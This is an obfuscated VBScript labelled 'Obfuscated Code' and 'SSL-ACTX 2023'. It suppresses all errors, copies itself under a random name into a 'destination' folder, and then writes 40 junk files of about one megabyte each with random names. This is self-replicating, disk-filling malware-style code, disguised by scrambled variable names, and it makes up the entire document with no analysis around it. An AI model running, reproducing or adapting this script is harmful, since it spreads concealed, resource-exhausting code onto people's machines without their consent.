' Obfuscated Code
' SSL-ACTX
' 2023
On Error Resume Next:Dim xFSo,CmE,A4s,P7L,dPQ,jAa,w3C,Y30,Z6W,v9T,Q96
Set xFSo=CreateObject("Scripting.FileSystemObject"):CmE=WScript.ScriptFullName
A4s="destination":If Not xFSo.FolderExists(A4s) Then xFSo.CreateFolder A4s
Randomize:Dim ZYr:ZYr="cr_"&Int((1000*Rnd)+1)&"_"&Replace(WScript.ScriptName," ","_")
P7L=A4s&"\"&ZYr:xFSo.CopyFile CmE,P7L,True:numCopies=40
For i=1 To numCopies:CpN="cp_"&i&"_":For J=1 To 8:CpN=CpN&Chr(Int((25*Rnd)+65)):Next
dPQ=A4s&"\"&CpN:Randomize:Set jAa=CreateObject("MSXML2.DOMDocument.6.0").CreateElement("Random")
jAa.DataType="bin.base64":jAa.Text=String(1024*1024,"A"):Y30=Mid(jAa.NodeTypedValue,1,1024*1024)
Set w3C=xFSo.CreateTextFile(dPQ,True):w3C.Write Y30:w3C.Close:Next:Set xFSo=Nothing

